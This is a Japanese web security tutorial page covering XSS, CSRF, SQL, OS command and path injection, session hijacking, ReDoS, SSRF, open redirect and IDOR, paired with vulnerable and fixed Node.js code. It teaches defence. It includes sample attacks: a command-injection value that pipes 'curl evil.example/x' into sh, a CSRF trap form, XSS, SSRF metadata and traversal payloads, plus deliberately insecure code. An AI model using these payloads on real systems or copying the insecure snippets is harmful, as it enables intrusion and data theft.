<!-- scripts/memo.py build が自動生成。手で編集しない -->

# 実装起因の脆弱性

> XSS・CSRF・SQL インジェクション・OS コマンドインジェクション・セッションハイジャック・ReDoS に、パストラバーサル・SSRF・オープンリダイレクト・認可不備を加えて、攻撃の流れと NG/OK コードで図解。

- URL: https://memo.taka1156.site/web-vulnerabilities.html
- タグ: セキュリティ, バックエンド
- 日付: 2026-11-03

---

攻撃の多くは「信頼できない入力が、それを解釈する何かにそのまま届く」場所で起きる

**ざっくり言うと**

- **インジェクション系** （XSS・SQL・OS コマンド・パス）は、データが **コードとして解釈される** ことが原因。対策は「入力を消毒」より、 **出力先ごとにデータとコードを分ける** （プレースホルダ・エスケープ・引数配列）
- **CSRF・セッションハイジャック** は、ブラウザが **自動で送る Cookie** を悪用する。SameSite・トークン・ログイン時の ID 再生成で防ぐ
- **ReDoS・SSRF・認可不備** は、計算量・サーバーの置き場所・権限チェック漏れの問題。ライブラリ任せにできず **設計で防ぐ**

## 全体マップ

左の「外から来る値」が、右の「解釈するもの」にそのまま渡ると脆弱性になります。カードを押すと各セクションへ。

外から来る値

URL のクエリ・パス フォーム / JSON の本文 ヘッダー・Cookie アップロードファイル名 DB に保存済みの値

アプリ

解釈するもの（sink）

HTML / DOM

XSS

SQL

SQL インジェクション

シェル

OS コマンド

ファイルパス

パストラバーサル

正規表現エンジン

ReDoS

サーバーからの URL 取得

SSRF

リダイレクト先

オープンリダイレクト

入力の中身ではなく、仕組みの穴を突くもの:

ブラウザが Cookie を自動で付ける

CSRF

セッション ID ＝ ログインの鍵

セッションハイジャック

「誰のデータか」の確認漏れ

認可不備 (IDOR)

| 脆弱性 | 何が起きる | 根本対策 | 補助・多層防御 |
| --- | --- | --- | --- |
| XSS | 他人のブラウザで攻撃者の JS が動く | 出力先の文脈に合ったエスケープ（テンプレートの自動エスケープ） | CSP、HttpOnly Cookie |
| CSRF | ログイン中のユーザーに、意図しない操作をさせる | SameSite Cookie ＋ トークン or Origin / Sec-Fetch-Site 検証 | 重要操作の再認証 |
| SQLi | DB の読み出し・改ざん・認証回避 | プレースホルダ（パラメータ化クエリ） | DB ユーザーの権限最小化 |
| OS コマンド | サーバー上で任意のコマンド実行 | シェルを通さない（引数配列）、そもそも外部コマンドを使わない | 入力の許可リスト、実行ユーザーの権限最小化 |
| セッションハイジャック | 他人としてログインされる | 推測不能な ID、ログイン時に再生成、Secure / HttpOnly | 有効期限、重要操作の再認証 |
| ReDoS | 1 リクエストで CPU を占有しサービス停止 | 危険な正規表現を書かない、線形時間のエンジン | 入力長の上限 |
| パストラバーサル | 公開ディレクトリ外のファイルを読まれる・書かれる | 正規化してから基準ディレクトリ内か確認、ID で引く | 実行ユーザーの権限 |
| SSRF | サーバー経由で内部ネットワークやクラウドのメタデータにアクセス | 接続先の許可リスト | 内部宛ての遮断、IMDSv2 |
| オープンリダイレクト | 正規ドメインを踏み台にフィッシングへ誘導 | 自サイト内のパスだけ許可 | — |
| IDOR | ID を書き換えて他人のデータを見る・変える | 毎回「このユーザーの持ち物か」を確認 | 推測しにくい ID（それだけでは不十分） |

## 共通の考え方

① データとコードを分ける

文字列を連結してから「解釈するもの」に渡さない。プレースホルダ・引数配列・ `textContent` のように、 **最初から「これはデータ」と伝える API** を使う。

② 出すときに、出す先に合わせる

エスケープは **出力時に、出力先の文脈（HTML / 属性 / URL / SQL）で** 行う。入力時に一律で「危険な文字を消す」と、文脈が違う場所で漏れたり、正しいデータを壊したりする。

③ 許可リストで検証する

「危ないものを弾く（拒否リスト）」ではなく「想定したものだけ通す」。並び替え列・ホスト名・ファイル名・リダイレクト先は特に。

④ 破られた前提で被害を絞る

DB ユーザー・プロセスの権限最小化、 [セキュリティヘッダー](https://memo.taka1156.site/md/security-headers.md) 、ログと監視。1 枚の壁に頼らない。

## XSS Cross-Site Scripting

ユーザー入力が HTML として解釈され、 **他のユーザーのブラウザで攻撃者の JavaScript が動く** 。そのページの権限で、表示の書き換え・入力の盗み見・ユーザーになりすましたリクエスト送信ができます。

反射型

格納型

DOM ベース

1. 攻撃者が `/search?q=<script>…</script>` のリンクを用意
2. 被害者がメールや SNS のリンクを踏む
3. サーバーが `q` をそのまま HTML に埋めて返す
4. 被害者のブラウザでスクリプトが実行される
1. 攻撃者がコメント欄やプロフィールにスクリプトを投稿
2. DB に保存される
3. そのページを見た **全員** のブラウザで実行される

リンクを踏ませる必要がなく、被害が広がりやすい。管理画面で表示される問い合わせ内容なども狙われる。

1. 攻撃者が `/#<img src=x onerror=…>` のリンクを用意
2. フロントの JS が `location.hash` を `innerHTML` に入れる
3. サーバーを通らずに実行される（# 以降はサーバーに送られない）

サーバー側のエスケープでは防げない。フロントエンドで危険な API を使っていないかが問題。

NG

```
app.get('/search', (req, res) => {
  res.send(`<p>「${req.query.q}」の結果</p>`);
});

// フロント
el.innerHTML = location.hash.slice(1);
link.href = user.website; // javascript:… も入る
```

OK

```
// テンプレートエンジンの自動エスケープに任せる
res.render('search', { q: req.query.q }); // <%= q %>

// フロント: 文字列はテキストとして入れる
el.textContent = location.hash.slice(1);
// URL はスキームを確認してから
const u = new URL(user.website);
if (['https:', 'http:'].includes(u.protocol)) link.href = u.href;
```

（元のページで操作できます → https://memo.taka1156.site/web-vulnerabilities.html#xss）

### エスケープは「どこに出すか」で変わる

| 出力先 | 例 | 必要な処理 |
| --- | --- | --- |
| HTML の本文 | `<p>{x}</p>` | `& < >` をエスケープ |
| 属性値 | `<input value="{x}">` | 上に加えて `" '` 。属性は必ず引用符で囲む |
| URL 属性 | `<a href="{x}">` | エスケープだけでは不十分。 `javascript:` を防ぐため スキームを許可リストで確認 |
| <script> の中 | `var a = '{x}'` | HTML エスケープでは防げない。 `data-*` 属性や JSON（ `<` をエスケープ）で渡す |
| イベント属性・ `style` | `onclick="{x}"` | ユーザー入力を入れない |

React / Vue / Svelte なども、 `{x}` の埋め込みは自動でエスケープしますが、 `dangerouslySetInnerHTML` / `v-html` / `{@html}` は **素通し** です。ユーザーの HTML を表示したいときは DOMPurify などのサニタイザーを通します。

根本対策

- テンプレートの自動エスケープを使い、無効化しない
- `innerHTML` 系を避け `textContent`
- URL はスキームを確認

補助

- [CSP](https://memo.taka1156.site/md/security-headers.md) （nonce 方式）で注入スクリプトを止める
- Cookie に HttpOnly
- Trusted Types で危険な API を封じる

## CSRF Cross-Site Request Forgery

ブラウザは、どのサイトから送られたリクエストでも、 **宛先サイトの Cookie を自動で付けてきた** 。これを利用して、ログイン中のユーザーに罠サイトから「送金」「パスワード変更」などのリクエストを送らせる攻撃です。攻撃者はレスポンスを読めませんが、 **操作が実行されれば十分** です。

1. 被害者は `bank.example` にログイン中（Cookie あり）
2. 罠サイト `evil.example` を開く
3. 罠ページの隠しフォームが `bank.example/transfer` に自動 POST
4. ブラウザが bank の Cookie を付けて送信 → 正規の操作として処理される

```
<!-- evil.example 上の罠 -->
<form action="https://bank.example/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="100000">
</form>
<script>document.forms[0].submit()</script>
```

NG

```
// Cookie があればそのまま実行
app.post('/transfer', requireLogin, transfer);

// GET で状態を変える（リンク 1 つで発火）
app.get('/account/delete', requireLogin, del);

res.cookie('sid', id); // SameSite 未指定
```

OK

```
res.cookie('__Host-sid', id, {
  secure: true, httpOnly: true, path: '/',
  sameSite: 'lax',
});

// 状態を変えるリクエストは送信元を確認
app.use((req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  const site = req.get('Sec-Fetch-Site');
  if (site) {
    if (site === 'same-origin' || site === 'none') return next();
    return res.status(403).end();
  }
  // 古いブラウザ向け: Origin ヘッダーで確認
  if (req.get('Origin') === 'https://bank.example') return next();
  return res.status(403).end();
});
```

| 対策 | 仕組み | 注意点 |
| --- | --- | --- |
| `SameSite=Lax` / `Strict` | 別サイトからの POST・iframe・fetch に Cookie を付けない | Lax は トップレベルの GET 遷移では送る ので、GET で状態を変えると防げない。SameSite の「サイト」は登録ドメイン単位なので、 脆弱なサブドメイン からは同一サイト扱いで送られる |
| CSRF トークン | フォームにセッションと紐づく乱数を埋め、送信時に照合。罠サイトはその値を読めない | フレームワークの仕組みを使う。トークンを URL に載せない |
| `Sec-Fetch-Site` / `Origin` の検証 | ブラウザが付ける送信元情報で、別サイトからのリクエストを拒否 | 主要ブラウザが対応。Go 1.25 の `http.CrossOriginProtection` もこの方式 |
| JSON API ＋ カスタムヘッダー必須 | 独自ヘッダー付きのクロスオリジン要求はプリフライトが必要になり、CORS で許可しない限り送れない | `Content-Type: text/plain` などの単純リクエストを受け付けてしまわないこと（ [CORS](https://memo.taka1156.site/md/cors-sop.md) ） |

Cookie ではなく `Authorization: Bearer` ヘッダーでトークンを送る API は、ブラウザが自動で付けないので CSRF の対象になりにくい（その代わり XSS でトークンを読まれる。 [JWT とセッション](https://memo.taka1156.site/md/jwt-vs-session.md) ）。

## SQL インジェクション

入力を文字列連結で SQL に埋めると、入力中の `'` で文字列が閉じられ、 **後ろが SQL の命令として解釈** されます。

```
SELECT * FROM users WHERE email = '' OR 1=1 --' AND password_hash = '…'
                                      ↑ ここで文字列が閉じ、OR 1=1 で全件一致、-- 以降はコメント扱い
```

ほかにも `UNION SELECT` で別テーブルを読む、 `; DROP TABLE` で複数文を実行する（ドライバーが許す場合）、応答時間の差から 1 文字ずつ推測する（ブラインド SQLi）などがある。

NG

```
import { sql } from 'drizzle-orm';

// sql.raw() は文字列をエスケープせずそのまま埋め込む
await db.execute(sql.raw(
  `SELECT * FROM users WHERE email = '${email}'`
));

// 並び替え列を外から受け取る
db.select().from(items)
  .orderBy(sql.raw(req.query.sort));

// sql`` の中でも sql.raw を挟むと素通し
db.execute(sql`… WHERE name = ${sql.raw(`'${name}'`)}`);
```

OK

```
import { sql, eq, asc, desc } from 'drizzle-orm';

// クエリビルダー: 値は自動でプレースホルダ ($1) になる
const rows = await db.select().from(users)
  .where(eq(users.email, email));

// 生 SQL も sql`` タグなら ${} はパラメータとして別送
await db.execute(
  sql`SELECT * FROM ${users} WHERE ${users.email} = ${email}`
);

// 列・並び順はプレースホルダにできない → 許可リストから選ぶ
const SORT = new Map([
  ['new', desc(items.createdAt)],
  ['price', asc(items.price)],
]);
const order = SORT.get(String(req.query.sort)) ?? SORT.get('new');
db.select().from(items).orderBy(order);
```

`users` / `items` は Drizzle のテーブル定義（ `pgTable` など）。 `sql``` に渡した値は `$1` などに置き換えられて別送され、テーブル・列オブジェクトは識別子としてエスケープされます。危ないのは文字列を加工せず入れる `sql.raw()` に外からの値を渡したときです。許可リストを普通のオブジェクトにして `obj[key]` で引くと、 `constructor` などの継承プロパティも当たってしまうので、 `Map` か `Object.hasOwn()` で確認します。

根本対策

- すべての値をプレースホルダで渡す
- テーブル名・列名・ `ASC/DESC` は許可リストから選ぶ
- `LIKE` の `% _` は値としてエスケープ

補助

- アプリ用 DB ユーザーの権限を最小に（DDL 不可など）
- DB のエラー内容を画面に出さない

## OS コマンドインジェクション

入力をシェルのコマンド文字列に埋めると、 `;` `|` `&&` `$()` ``…`` などの **シェルの記号** で、別のコマンドをつなげられます。サーバー上で任意のコマンドが実行されるので、被害は最大級です。

1. 「ping テスト」画面にホスト名を入力させる
2. 攻撃者が `8.8.8.8; curl evil.example/x | sh` と入力
3. サーバーが `sh -c "ping -c 1 8.8.8.8; curl … | sh"` を実行

NG

```
import { exec } from 'node:child_process';

// exec はシェル経由で実行する
exec(`ping -c 1 ${req.body.host}`, cb);

// spawn でも shell: true なら同じ
spawn(`convert ${file} out.png`, { shell: true });
```

OK

```
import { execFile } from 'node:child_process';
import net from 'node:net';

const host = req.body.host;
// ① 許可リストで検証（- で始まる値はオプション扱いされる）
if (!net.isIP(host)) return res.status(400).end();

// ② シェルを通さず、引数を配列で渡す
execFile('ping', ['-c', '1', host], cb);
```

根本対策

- 外部コマンドを使わず、言語のライブラリで処理する（画像処理・圧縮・メール送信など）
- 使うなら `execFile` / `spawn` の引数配列（シェルを起動しない）

補助

- 引数配列でも、 `-` 始まりの値は **オプションとして解釈** される（引数インジェクション）。許可リストで検証し、対応コマンドなら `--` で区切る
- Windows で `.bat` / `.cmd` を起動すると cmd.exe が引数を解釈する。避ける
- 実行ユーザーの権限を最小に、コンテナで隔離

## セッションハイジャック

ログイン後のユーザーは、Cookie の **セッション ID だけ** で識別されます。ID を手に入れれば、パスワードなしでそのユーザーになりすませます。手に入れる方法ごとに対策が違います。

盗む方法と対策

セッション固定

| 手口 | 対策 |
| --- | --- |
| 盗聴 : http 通信や SSL ストリップで Cookie を見る | 全ページ https、Cookie に `Secure` 、 [HSTS](https://memo.taka1156.site/md/security-headers.md) |
| XSS : `document.cookie` を外部へ送る | `HttpOnly` 、そもそも XSS を潰す |
| 推測 : 連番・時刻・ユーザー ID から ID を当てる | 暗号論的乱数で 128 ビット以上（自作せずフレームワークに任せる） |
| 固定 : 攻撃者が用意した ID でログインさせる | ログイン成功時に ID を作り直す 、 `__Host-` 接頭辞 |
| 漏えい : URL に ID が載り、Referer・ログ・共有で漏れる | ID は Cookie だけで扱い、URL に載せない |
| 放置 : 共有 PC でログアウトし忘れ、盗まれた ID がずっと使える | 無操作タイムアウト・絶対的な有効期限、ログアウトでサーバー側のセッションを破棄 |

1. 攻撃者がサイトにアクセスし、未ログインのセッション ID `ABC` を手に入れる
2. 被害者のブラウザに `ABC` を仕込む（脆弱なサブドメインからの Cookie 設定など）
3. 被害者がログイン。サーバーが **同じ ID `ABC` のまま** ログイン状態にする
4. 攻撃者も `ABC` を持っているので、被害者としてログイン済み

ログイン時に ID を新しく作れば、攻撃者の持つ `ABC` は無効になる。

NG

```
app.post('/login', async (req, res) => {
  const user = await verify(req.body);
  if (!user) return res.status(401).end();
  // 同じセッション ID のままログイン状態にする
  req.session.userId = user.id;
  res.redirect(`/home?sid=${req.sessionID}`);
});
```

OK

```
app.use(session({
  name: '__Host-sid',
  secret: process.env.SESSION_SECRET,
  cookie: { secure: true, httpOnly: true, sameSite: 'lax',
            path: '/', maxAge: 30 * 60 * 1000 },
  rolling: true, // 操作のたびに期限を延長（無操作 30 分で失効）
}));

app.post('/login', async (req, res, next) => {
  const user = await verify(req.body);
  if (!user) return res.status(401).end();
  req.session.regenerate(err => {  // 新しい ID を発行
    if (err) return next(err);
    req.session.userId = user.id;
    res.redirect('/home');
  });
});

app.post('/logout', (req, res) =>
  req.session.destroy(() => res.redirect('/')));
```

パスワード変更・メールアドレス変更・送金などの重要操作では、セッションがあっても **パスワードやパスキーで再確認** すると、ID を盗まれたときの被害を限定できます。

（元のページで操作できます → https://memo.taka1156.site/web-vulnerabilities.html#session）

## ReDoS Regular expression Denial of Service

多くの言語の正規表現エンジン（JavaScript・Python・Java・PHP など）は、失敗すると別の分け方を試し直す **バックトラック** 方式です。 `(a+)+` のように **量指定子が入れ子** になっていると、マッチに失敗する入力で分け方の組み合わせが **指数関数的** に増えます。

```
/^(a+)+$/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!')
// 末尾の ! で必ず失敗する。そこまでに 'aaa…' を (a+) の繰り返しに
// 分ける方法は 2^(n-1) 通り。全部試してから false を返す
```

**実際に測ってみる**

このブラウザで `/^(a+)+$/` に「a × n 個 + !」を渡した時間です。重くなりすぎないよう n は 24 までにしています。比較用に、同じ意味の安全な `/^a+$/` も測ります。

最大 n 22

計測する

**Node.js では特に致命的:** JS の正規表現は同期処理なので、マッチ中は **イベントループが止まり、他のすべてのリクエストが待たされます** 。30 文字程度の入力 1 回で、サーバー全体が数秒〜数分止まります。 `async` にしても try/catch しても防げません。

（元のページで操作できます → https://memo.taka1156.site/web-vulnerabilities.html#redos）

### 危ない形

| パターン | 理由 | 書き換え例 |
| --- | --- | --- |
| `(a+)+` / `(\w+)*` / `(.*)*` | 量指定子の入れ子 | `a+` / `\w*` |
| `(\w+\s?)*$` | `\s?` が省略できるため、実質 `(\w+)*` | `\w+(\s\w+)*$` |
| `(a\|a)*` / `(\d\|\w)+` | 選択肢が同じ文字に重なる | 重ならない文字クラスにする |
| `\s*,\s*` を長い入力に繰り返し適用 | 指数ではないが多項式時間（n² など）で重くなる | 入力長の上限、split などの単純処理に置き換える |

根本対策

- 入れ子・重なりのある正規表現を書かない（ `eslint-plugin-regexp` などの lint で検出）
- ユーザーが正規表現を指定できる機能や重い検証には、 **線形時間のエンジン** （RE2 / Rust の regex / Go の regexp）を使う

補助

- マッチの前に入力長を制限する（メールアドレスなら 254 文字など）
- タイムアウト指定ができる言語では設定する（.NET の `matchTimeout` など）
- 重い処理はワーカーに分け、メインのリクエスト処理を止めない

## パストラバーサル Path Traversal

ファイル名を入力から受け取ると、 `../` で親ディレクトリにさかのぼり、 **公開するつもりのないファイル** （設定ファイル・秘密鍵・ `/etc/passwd` ）を読まれたり、書き込まれたりします。

NG

```
// GET /files?name=../../app/.env
const p = path.join('uploads', req.query.name);
res.sendFile(path.resolve(p));

// 「../ を消す」は回避される
// ....// → ../ 、%2e%2e%2f 、..\ など
name.replace('../', '');
```

OK

```
const BASE = path.resolve('uploads');

const target = path.resolve(BASE, req.query.name);
// 正規化した結果が BASE の中かを確認
if (!target.startsWith(BASE + path.sep)) {
  return res.status(400).end();
}
res.sendFile(target);

// より良い: 名前ではなく ID で引き、実体のパスは DB に持つ
const [file] = await db.select().from(files)
  .where(and(eq(files.id, id), eq(files.ownerId, userId)));
```

`startsWith(BASE)` だけだと `uploads-secret/` のような隣のディレクトリが通るので、末尾に区切り文字を付けて比べます。シンボリックリンクを置ける環境では `fs.realpath` で実体を確認します。アップロード時の保存名は、ユーザーのファイル名を使わずサーバーで生成します。

## SSRF Server-Side Request Forgery

「URL を入れると OGP を取ってくる」「Webhook の送信先を登録」「画像を URL から取り込む」など、 **サーバーが利用者の指定した URL にアクセスする** 機能を悪用し、外から届かない内部の宛先を叩かせる攻撃です。

1. 攻撃者が URL に `http://169.254.169.254/latest/meta-data/…` を指定
2. サーバーがその URL を取得（サーバーからはクラウドのメタデータサービスに届く）
3. 一時認証情報などがレスポンスとして攻撃者に返る / 内部の管理画面や DB を操作される

NG

```
app.post('/preview', async (req, res) => {
  const r = await fetch(req.body.url);
  res.send(await r.text());
});

// 文字列チェックは回避される
// http://127.1/ 、http://[::1]/ 、http://0x7f000001/
// 外部ドメインが 127.0.0.1 に解決される、
// 外部 URL から内部へリダイレクトする…
```

OK

```
const ALLOWED = new Set(['api.partner.example', 'cdn.example.com']);

const url = new URL(req.body.url);
if (url.protocol !== 'https:' || !ALLOWED.has(url.hostname)) {
  return res.status(400).end();
}
const r = await fetch(url, { redirect: 'error' });
```

任意の URL を受けるしかない機能（Webhook など）では、許可リストの代わりに次を重ねます。

- DNS を解決して得た IP が、プライベート・ループバック・リンクローカル（ `10/8` ・ `127/8` ・ `169.254/16` ・ `::1` など）なら拒否
- チェックした IP にそのまま接続する（チェック後に再解決させない＝ DNS リバインディング対策）。リダイレクトは追わないか、追うたびに再チェック
- ネットワーク側で、取得用のサーバー・プロキシから内部への通信を遮断。AWS ならメタデータを IMDSv2（トークン必須）にする
- 取得したレスポンスをそのまま返さない（必要な項目だけ取り出す）

## オープンリダイレクト Open Redirect

ログイン後の戻り先 `?next=` などで、 **外部サイトへ転送できてしまう** 問題です。リンクの見た目は正規ドメインなので、フィッシングに使われます。OAuth の `redirect_uri` と組み合わさると、認可コードやトークンが攻撃者に流れることもあります。

NG

```
res.redirect(req.query.next);

// 「/ で始まるか」だけでは不十分
if (next.startsWith('/')) res.redirect(next);
// //evil.example  → プロトコル相対 URL で外部へ
// /\evil.example  → ブラウザは \ を / と読む
```

OK

```
const ORIGIN = 'https://app.example.com';

function safeNext(next) {
  if (typeof next !== 'string') return '/';
  try {
    const u = new URL(next, ORIGIN);   // ブラウザと同じ規則で解釈
    if (u.origin !== ORIGIN) return '/';
    return u.pathname + u.search + u.hash;
  } catch {
    return '/';
  }
}
res.redirect(safeNext(req.query.next));
```

`new URL()` で解釈すると、 `//evil.example` も `/\evil.example` もオリジンが evil.example になり、 `javascript:` はオリジンが `null` になるので、まとめて弾けます。

## 認可不備 / IDOR Insecure Direct Object Reference

ログインしているか（認証）は確認しているのに、 **そのデータがこのユーザーのものか（認可）** を確認していない問題です。URL や JSON の ID を書き換えるだけで、他人の注文・請求書・個人情報が見えます。ツールでは見つけにくく、実際の事故で最も多い種類の 1 つです。

NG

```
// GET /api/orders/1024 → 1025 に変えると他人の注文
app.get('/api/orders/:id', requireLogin, async (req, res) => {
  const [order] = await db.select().from(orders)
    .where(eq(orders.id, req.params.id));
  res.json(order);
});

// 受け取った値をそのまま更新に渡す（Mass Assignment）
// req.body は any なので型チェックも素通りする
await db.update(users).set(req.body).where(eq(users.id, me));
// → { "role": "admin" } も通る
```

OK

```
import { and, eq } from 'drizzle-orm';

app.get('/api/orders/:id', requireLogin, async (req, res) => {
  const [order] = await db.select().from(orders).where(and(
    eq(orders.id, req.params.id),
    eq(orders.userId, req.user.id),
  ));
  // 他人のものは「存在しない」と同じ扱い
  if (!order) return res.status(404).end();
  res.json(order);
});

// 更新してよい項目だけ取り出す
const { name, bio } = req.body;
await db.update(users).set({ name, bio }).where(eq(users.id, me));
```

- ID を UUID にすると推測は難しくなるが、URL の共有やログから漏れれば読める。 **認可チェックの代わりにはならない**
- チェックをハンドラーごとに書くと漏れるので、「必ず所有者で絞るリポジトリ関数」やポリシー層にまとめる
- 一覧・検索・エクスポート・管理用 API など、 **画面に出ていないエンドポイント** も同じ確認が必要

## よくある誤解

入力時に危険な文字を消しておけば、どこに出しても安全

安全な形は出力先（HTML・SQL・シェル・URL）ごとに違う。入力では形式の検証、出力では文脈に合わせた分離・エスケープ。

ORM を使っているので SQL インジェクションはない

Drizzle なら `sql.raw()` のように文字列をそのまま埋め込む API に外からの値を渡したときや、並び替え列の受け取りで起きる。

POST にしたので CSRF は大丈夫

罠サイトのフォームから POST は送れる。SameSite・トークン・送信元の検証が必要。

https なのでセッションは盗まれない

XSS・固定・URL への ID 漏れ・推測しやすい ID は https と関係ない。

正規表現は小さな処理なので DoS とは無関係

入れ子の量指定子があると、数十文字の入力で数秒〜数分 CPU を占有する。
